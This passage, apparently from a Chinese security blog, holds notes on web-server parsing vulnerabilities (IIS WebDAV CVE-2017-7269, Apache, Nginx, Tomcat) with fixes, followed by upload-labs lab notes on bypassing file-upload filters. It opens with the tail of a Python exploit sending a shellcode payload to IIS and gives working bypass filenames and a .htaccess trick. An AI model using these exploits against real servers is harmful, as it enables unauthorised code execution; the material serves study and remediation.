class=\"symbol\">\\x</span>8c<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>b8<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e2<span class=\"symbol\">\\x</span>a7<span class=\"symbol\">\\x</span>a7<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>81'</span><br><span class=\"line\">    shellcodespan><br><span class=\"line\">    pay+=shellcode</span><br><span class=\"line\">    pay+='&gt;<span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span><span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span>'</span><br><span class=\"line\">    return pay</span><br><span class=\"line\"></span><br><span class=\"line\">def send_pack(ip,port=80) :</span><br><span class=\"line\">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    sock.connect((ip,port))</span><br><span class=\"line\">    time_tick=time.time()</span><br><span class=\"line\">    sock.send(generate_payload(str(port)))</span><br><span class=\"line\">    </span><br><span class=\"line\">    try :</span><br><span class=\"line\">        data = sock.recv(80960)  </span><br><span class=\"line\">    except :</span><br><span class=\"line\">        pass</span><br><span class=\"line\">    </span><br><span class=\"line\">    print data</span><br><span class=\"line\">    </span><br><span class=\"line\">    sock.close()</span><br><span class=\"line\">    </span><br><span class=\"line\">    if not -1==data.find('HHIT CVE-2017-7269 Success') :</span><br><span class=\"line\">        return True</span><br><span class=\"line\">    </span><br><span class=\"line\">    return False</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">if 2==len(sys.argv) :</span><br><span class=\"line\">    print send_pack(sys.argv[1])</span><br><span class=\"line\">else :</span><br><span class=\"line\">    print send_pack(sys.argv[1],int(sys.argv[2]))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/005_1.png\" alt=\"005_1\"></p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p><code>https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2</code></p>\n<p>将上面的<code>cve-2017-7269.rb</code>拷贝到kali的<code>/usr/share/metasploit-framework/modules/exploits/windows/iis</code>下</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/005_2.png\" alt=\"005_2\"></p>\n<h3 id=\"修复方式-1\"><a href=\"#修复方式-1\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><ol>\n<li>由于微软已不再对Windows Server 2003提供支持，建议禁用webDAV功能。</li>\n<li>升级到最新系统 Windows Server 2016。</li>\n</ol>\n<h1 id=\"Apache相关\"><a href=\"#Apache相关\" class=\"headerlink\" title=\"Apache相关\"></a>Apache相关</h1><h2 id=\"Apache-HTTPD-换行解析漏洞（CVE-2017-15715）\"><a href=\"#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）\" class=\"headerlink\" title=\"Apache HTTPD 换行解析漏洞（CVE-2017-15715）\"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>环境采用vulhub的<code>/httpd/CVE-2017-15715</code></p>\n<h3 id=\"漏洞原理-4\"><a href=\"#漏洞原理-4\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>Apache版本在2.4.0到2.4.29</p>\n<p>正则中的<code>$</code>不仅可以匹配行尾,如果设置了 RegExp 对象的 Multiline 属性，则 <code>$</code>也匹配 ‘\\n’ 或 ‘\\r’。</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">&lt;FilesMatch \\.php$&gt;</span></span><br><span class=\"line\">        <span class=\"attribute\"><span class=\"nomarkup\">SetHandler</span></span> application/x-httpd-php</span><br><span class=\"line\"><span class=\"section\">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>因此16进制的换行符能被<code>$</code>匹配从而被PHP解析。</p>\n<h3 id=\"实践过程\"><a href=\"#实践过程\" class=\"headerlink\" title=\"实践过程\"></a>实践过程</h3><p>可以利用到文件上传中来绕过黑名单,在Apache版本(2.4.0到2.4.29)中上传的<code>info.php%0A</code>文件又能被解析,即可getshell。</p>\n<p>这个docker环境没有前端代码的,加一个</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#upload.html</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CVE-2017-15715<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"index.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"file\"</span> <span class=\"attr\">name</span>=<span class=\"string\">'file'</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"upload\"</span>&gt;</span></span><br><span class=\"line\">\t    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#index.php</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = basename(<span class=\"variable\">$_POST</span>[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$ext</span> = pathinfo(<span class=\"variable\">$name</span>,PATHINFO_EXTENSION);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$ext</span>, [<span class=\"string\">'php'</span>, <span class=\"string\">'php3'</span>, <span class=\"string\">'php4'</span>, <span class=\"string\">'php5'</span>, <span class=\"string\">'phtml'</span>, <span class=\"string\">'pht'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'bad file'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>][<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'./'</span> . <span class=\"variable\">$name</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>直接上传php文件会被exit,现在将上传的文件名修改成<code>info.php%0a</code></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/003_1.png\" alt=\"003_1\"></p>\n<p>已经上传成功</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/003_2.png\" alt=\"003_2\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/003_3.png\" alt=\"003_3\"></p>\n<p>确实是存在解析漏洞的。</p>\n<p>windows操作系统不允许后缀以换行符结尾的文件命名方式，创建文件会失败，所以还是比较鸡肋的。</p>\n<h3 id=\"修复方式-2\"><a href=\"#修复方式-2\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><p>获取文件名时用<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>,它会将换行符号自动去除。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"comment\">#$name = basename($_POST['name']);</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>][<span class=\"string\">'name'</span>];</span><br><span class=\"line\">    <span class=\"variable\">$ext</span> = pathinfo(<span class=\"variable\">$name</span>,PATHINFO_EXTENSION);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$ext</span>, [<span class=\"string\">'php'</span>, <span class=\"string\">'php3'</span>, <span class=\"string\">'php4'</span>, <span class=\"string\">'php5'</span>, <span class=\"string\">'phtml'</span>, <span class=\"string\">'pht'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'bad file'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>][<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'./'</span> . <span class=\"variable\">$name</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/003_4.png\" alt=\"003_4\"></p>\n<p>可以看到上传失败了。</p>\n<ol>\n<li>上传文件功能配合白名单为过滤条件 </li>\n<li>上传文件目录限制脚本执行权限</li>\n</ol>\n<h2 id=\"Apache-HTTPD-未知后缀解析漏洞\"><a href=\"#Apache-HTTPD-未知后缀解析漏洞\" class=\"headerlink\" title=\"Apache HTTPD 未知后缀解析漏洞\"></a>Apache HTTPD 未知后缀解析漏洞</h2><p>环境采用vulhub的<code>/httpd/apache_parsing_vulnerability</code></p>\n<h3 id=\"漏洞原理-5\"><a href=\"#漏洞原理-5\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>Apache默认一个文件可以有多个点分隔的后缀,如果最右的后缀无法解析会向左推进。加上运维人员错误配置如下</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AddHandler <span class=\"built_in\">application</span>/x-httpd-php .php</span><br></pre></td></tr></table></figure>\n\n<p>可以发现上面的配置没有正则匹配的，所以在任意位置匹配到<code>.php</code>，会拿去给<code>php_module</code>解析。</p>\n<h3 id=\"实践过程-1\"><a href=\"#实践过程-1\" class=\"headerlink\" title=\"实践过程\"></a>实践过程</h3><p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/004_1.png\" alt=\"004_1\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/004_2.png\" alt=\"004_2\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/004_3.png\" alt=\"004_3\"></p>\n<h3 id=\"修复方式-3\"><a href=\"#修复方式-3\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><p>修改AddHandler方法为SetHandler方法</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#AddHandler application/x-httpd-php .php</span></span><br><span class=\"line\"><span class=\"section\">&lt;FilesMatch \".+\\.php$\"&gt;</span></span><br><span class=\"line\"><span class=\"attribute\"><span class=\"nomarkup\">SetHandler</span></span> application/x-httpd-php</span><br><span class=\"line\"><span class=\"section\">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/004_4.png\" alt=\"004_4\"></p>\n<p>禁止<code>.php.</code>格式执行</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">&lt;FilesMatch \".+\\. ph(p[3457]?|t|tml)\\.\"&gt;</span></span><br><span class=\"line\"><span class=\"attribute\">Require</span> <span class=\"literal\">all</span> denied</span><br><span class=\"line\"><span class=\"section\">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Nginx相关\"><a href=\"#Nginx相关\" class=\"headerlink\" title=\"Nginx相关\"></a>Nginx相关</h1><h2 id=\"Nginx-lt-8-03畸形解析漏洞\"><a href=\"#Nginx-lt-8-03畸形解析漏洞\" class=\"headerlink\" title=\"Nginx &lt;8.03畸形解析漏洞\"></a>Nginx &lt;8.03畸形解析漏洞</h2><h3 id=\"漏洞原理-6\"><a href=\"#漏洞原理-6\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>测试环境采用的是<code>vulhub</code>的<code>nginx/nginx_parsing_vulnerability</code>,说是Nginx的锅,实际还是和上面的一样,还是<code>cgi.fix_pathinfo=1</code>,当访问<code>ngnix.png/.php</code>时,<code>ngnix.png/.php</code>存在而进行修剪,最终将<code>ngnix.png</code>当php解析。</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_7.png\" alt=\"002_7\"></p>\n<h4 id=\"Nginx修复方式-1\"><a href=\"#Nginx修复方式-1\" class=\"headerlink\" title=\"Nginx修复方式\"></a>Nginx修复方式</h4><ol>\n<li><p>修改php.ini文件，将cgi.fix_pathinfo的值设置为0</p>\n</li>\n<li><p>正则表达式过滤非法输入,代码如下</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#配置nginx.conf</span></span><br><span class=\"line\"><span class=\"attribute\">if</span> ( <span class=\"variable\">$fastcgi_script_name</span> <span class=\"regexp\">~ \\..*\\/.*php</span> ) &#123;</span><br><span class=\"line\">　　<span class=\"attribute\">return</span> <span class=\"number\">403</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；并设置PHP-FPM的<code>security.limit_extensions</code>为<code>.php</code>，避免其他后缀文件被解析。</p>\n</li>\n</ol>\n<h2 id=\"Nginx-配置错误导致漏洞\"><a href=\"#Nginx-配置错误导致漏洞\" class=\"headerlink\" title=\"Nginx 配置错误导致漏洞\"></a>Nginx 配置错误导致漏洞</h2><h3 id=\"目录穿越漏洞\"><a href=\"#目录穿越漏洞\" class=\"headerlink\" title=\"目录穿越漏洞\"></a>目录穿越漏洞</h3><h4 id=\"漏洞原因\"><a href=\"#漏洞原因\" class=\"headerlink\" title=\"漏洞原因\"></a>漏洞原因</h4><p>错误的配置导致目录遍历和信息泄露</p>\n<p><code>autoindex on</code>开启了目录遍历。Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>\n<p>错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/006_2.png\" alt=\"006_2\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/006_1.png\" alt=\"006_1\"></p>\n<h4 id=\"修复方式-4\"><a href=\"#修复方式-4\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h4><p>将<code>autoindex on;</code>改成<code>autoindex off</code>。</p>\n<p><code>/files</code>补全为<code>/files/</code></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/006_3.png\" alt=\"006_3\"></p>\n<h3 id=\"CRLF注入漏洞\"><a href=\"#CRLF注入漏洞\" class=\"headerlink\" title=\"CRLF注入漏洞\"></a>CRLF注入漏洞</h3><p>CRLF是”回车 + 换行”（\\r\\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>\n<p>Nginx会将<code>$uri</code>进行解码，导致传入%0a%0d即可引入换行符，而造成CRLF注入漏洞。</p>\n<p>查看Nginx文档，可以发现有三个表示uri的变量：</p>\n<ol>\n<li><code>$uri</code></li>\n<li><code>$document_uri</code></li>\n<li><code>$request_uri</code></li>\n</ol>\n<p>1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）。</p>\n<p>错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">listen</span> <span class=\"number\">8080</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"attribute\">root</span> /usr/share/nginx/html;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"attribute\">index</span> index.html;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"attribute\">server_name</span> _;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">        <span class=\"attribute\">return</span> <span class=\"number\">302</span> https://<span class=\"variable\">$host</span><span class=\"variable\">$uri</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"利用方式\"><a href=\"#利用方式\" class=\"headerlink\" title=\"利用方式\"></a>利用方式</h4><h5 id=\"会话固定\"><a href=\"#会话固定\" class=\"headerlink\" title=\"会话固定\"></a>会话固定</h5><p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/006_4.png\" alt=\"006_4\"></p>\n<h5 id=\"xss漏洞\"><a href=\"#xss漏洞\" class=\"headerlink\" title=\"xss漏洞\"></a>xss漏洞</h5><h5 id=\"设置Cookie引发的CSRF漏洞\"><a href=\"#设置Cookie引发的CSRF漏洞\" class=\"headerlink\" title=\"设置Cookie引发的CSRF漏洞\"></a>设置Cookie引发的CSRF漏洞</h5><h4 id=\"修复方式-5\"><a href=\"#修复方式-5\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h4><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">    <span class=\"attribute\">return</span> <span class=\"number\">302</span> https://<span class=\"variable\">$host</span><span class=\"variable\">$request_uri</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Tomcat相关\"><a href=\"#Tomcat相关\" class=\"headerlink\" title=\"Tomcat相关\"></a>Tomcat相关</h1><h2 id=\"PUT方法任意写文件漏洞-CVE-2017-12615\"><a href=\"#PUT方法任意写文件漏洞-CVE-2017-12615\" class=\"headerlink\" title=\"PUT方法任意写文件漏洞 (CVE-2017-12615)\"></a>PUT方法任意写文件漏洞 (CVE-2017-12615)</h2><h3 id=\"漏洞条件\"><a href=\"#漏洞条件\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h3><p>在Tomcat安装目录下的配置文件web.xml中的org.apache.catalina.servlets.DefaultServlet方法下如果该方法有如下代码，即表示Tomcat已开启PUT方法</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;init-<span class=\"built_in\">param</span>&gt; </span><br><span class=\"line\">      &lt;<span class=\"built_in\">param</span>-name&gt;readonly&lt;/<span class=\"built_in\">param</span>-name&gt; </span><br><span class=\"line\">      &lt;<span class=\"built_in\">param</span>-<span class=\"built_in\">value</span>&gt;<span class=\"literal\">false</span>&lt;/<span class=\"built_in\">param</span>-<span class=\"built_in\">value</span>&gt; </span><br><span class=\"line\">&lt;/init-<span class=\"built_in\">param</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/007_1.png\" alt=\"007_1\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/007_2.png\" alt=\"007_2\"></p>\n<h3 id=\"利用exp\"><a href=\"#利用exp\" class=\"headerlink\" title=\"利用exp\"></a>利用exp</h3><p><code>https://github.com/iBearcat/CVE-2017-12615</code></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/007_3.png\" alt=\"007_3\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/007_4.png\" alt=\"007_4\"></p>\n<h3 id=\"修复方式-6\"><a href=\"#修复方式-6\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><p>在Tomcat的web.xml 文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;init-<span class=\"built_in\">param</span>&gt;</span><br><span class=\"line\">      &lt;<span class=\"built_in\">param</span>-name&gt;readonly&lt;/<span class=\"built_in\">param</span>-name&gt;</span><br><span class=\"line\">      &lt;<span class=\"built_in\">param</span>-<span class=\"built_in\">value</span>&gt;<span class=\"literal\">true</span>&lt;/<span class=\"built_in\">param</span>-<span class=\"built_in\">value</span>&gt;</span><br><span class=\"line\">&lt;/init-<span class=\"built_in\">param</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p>确保readonly参数为true（默认值），即不允许DELETE和PUT操作。</p>\n"},{"title":"upload-labs笔记","date":"2018-11-06T09:22:33.000Z","_content":"\n# upload-labs笔记\n\n---\n\n## 0x01\n\n### 前端绕过\n\n![001](/img/fileupload/upload-labs/001.png)\n\n文件在前端使用了js函数检测,绕过前端即可。\n\n使用firefox的插件NoScript直接关掉js.\n\n![001_1](/img/fileupload/upload-labs/001_1.png)\n\n![001_2](/img/fileupload/upload-labs/001_2.png)\n\n![001_3](/img/fileupload/upload-labs/001_3.png)\n\n## 0x02\n\n### MIME绕过\n\n观察源码可以分析到只对文件的类型做了白名单检测,burp抓包后修改MIME文件类型即可成功上传。\n\n![002](/img/fileupload/upload-labs/002.png)\n\n![002_1](/img/fileupload/upload-labs/002_1.png)\n\n这里有个坑啊,原来我修改的jpg格式竟然不行。\n\n![002_3](/img/fileupload/upload-labs/002_3.png)\n\n## 0x03\n\n### 特殊可解析文件绕过\n\n尝试直接上传php文件,不予许上传,估计应用了黑名单。\n\n![003](/img/fileupload/upload-labs/003.png)\n\n尝试php1,发现能上传\n\n![003_1](/img/fileupload/upload-labs/003_1.png)\n\n由于没有配置其他php文件后缀,这个思路也不行。\n\n如果Apache的配置文件可以匹配php5的其他配置文件,那这里的黑名单就没有过滤。\n\n![003_2](/img/fileupload/upload-labs/003_2.png)\n\nApache和php常用的php程序文件后缀有phtml、pht、php3、php4和php5。\n\n这里还暂时没有其他思路。\n\n## 0x04\n\n黑名单检测。可以上传的文件gif ,png, jpeg;大小写无效;\n\n![004_0](/img/fileupload/upload-labs/004_0.png)\n\n### Apache解析漏洞\n\n![004](/img/fileupload/upload-labs/004.png)\n\n### .htaccess重写文件解析规则绕过\n\n上传先上传一个名为`.htaccess`文件，内容如下：\n\n```\n<FilesMatch \"04.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n![004_1](/img/fileupload/upload-labs/004_1.png)\n\n再上传04.png的文件\n\n![004_2](/img/fileupload/upload-labs/004_2.png)\n\n产生重写文件解析规则绕过绕过的原因是httpd.conf文件中的两处配置文件的原因和过滤不严。\n\n```\n#允许重写覆盖相关配置\nAllowOverride All \nLoadModule rewrite_module modules/mod_rewrite.so\n```\n\n### PHP 和 Windows环境的叠加特性\n\n分析文章：`https://www.ctolib.com/topics-88860.html`\n\n`:截断`产生空文件\n\n![004](/img/fileupload/upload-labs/004_3.png)\n\n然后将文件名改为`04.<`或`04.<<<`或`04.>>>`或`04.>><`后再次上传，重写`4.php`文件内容，Webshell代码就会写入原来的`04.php`空文件中。\n\n![004](/img/fileupload/upload-labs/004_4.png)\n\n## 0x05\n\n### 大小写绕过\n\n黑盒测试发现是黑名单过滤\n\n```\n特殊可解析后缀 ×\n上传`.htaccess`×\n点绕过 × \nwindows流绕过 ×\n```\n\n最后发现后缀大小写能绕过\n\n![005_1](/img/fileupload/upload-labs/005_1.png)\n\n可以查看源码看看还有什么可以绕过。\n\n![005_2](/img/fileupload/upload-labs/005_2.png)\n\n## 0x06\n\n### 空格绕过\n\n黑盒测试发现是黑名单过滤\n\n```\n上传后重命名文件 √\n后缀大小写 ×\n特殊可解析后缀 ×\n::$DATA绕过 ×\n空格绕过 √\n```\n\n![006_1](/img/fileupload/upload-labs/006_1.png)\n\n查看下源码\n\n![006_2](/img/fileupload/upload-labs/006_2.png)\n\n## 0x07\n\n### .绕过\n\n```\n黑名单\n上传后没有改名 √\n可上传jreg、png、gif、jpg √\n可上传php1 pHp1 √\n空格绕过  ×\n.htaccess ×\n.绕过 √\n```\n\n![007_1](/img/fileupload/upload-labs/007_1.png)\n\n![007_2](/img/fileupload/upload-labs/007_2.png)\n\n查看源码看看\n\n![007_3](/img/fileupload/upload-labs/007_3.png)\n\n没有过滤`.`的话应该可以利用windows和php叠加特性创建php空文件。\n\n### windows和php叠加特性绕过\n\n![007_4](/img/fileupload/upload-labs/007_4.png)\n\n再利用`<`进行重写。\n\n![007_5](/img/fileupload/upload-labs/007_5.png)\n\n写入成功\n\n![007_6](/img/fileupload/upload-labs/007_6.png)\n\n## 0x08\n\n### ::$DATA绕过\n\n```\n黑名单\n上传后没有改名\t\t√\n可上传jreg、png、gif、jpg\t\t√\n可上传::$DATA\t\t√\n可上传php1,pHp1,php.xxx,php. .\t\t√\n空格绕过  ×\n.htaccess ×\n.绕过 ×\n```\n\n::DATA仅支持Windows,在info.php中写入<?php phpinfo();?> 上传info.php::$DATA会在上传目录上生成一个info.php的文件\n\n![008_1](/img/fileupload/upload-labs/008_1.png)\n\n底下插入了phpinfo函数。\n\n![008_2](/img/fileupload/upload-labs/008_2.png)\n\n![008_3](/img/fileupload/upload-labs/008_3.png)\n\n### 相关特性\n\n```\n假设上传个info.php文件,服务器为windows,info.php内容为<?php phpinfo();?>\n\ninfo.php:a.jpg 生成info.php,内容为空\ninfo.php::$DATA 生成info.php,内容为<?php phpinfo();?>\ninfo.php::$INDEX_ALLOCATION  生成info.php文件夹\ninfo.php::$DATA\\0.jpg    生成0.jpg,内容为<?php phpinfo();?>\n\n\n```\n\n把Pass-07的检查::$DATA的注释掉测试一下\n\n![008_4](/img/fileupload/upload-labs/008_4.png)\n\n以上的测试在本地通过。\n\n## 0x09\n\n### php. .绕过\n\n```\n上传后没有改名\t\t√\n可上传jreg、png、gif、jpg\t\t√\n可上传::$DATA\t\t×\n可上传php1,pHp1,php.xxx,php. .\t\t√\n.绕过 ×\n.htaccess ×\n```\n\n根据没有改名和可以上传`php. 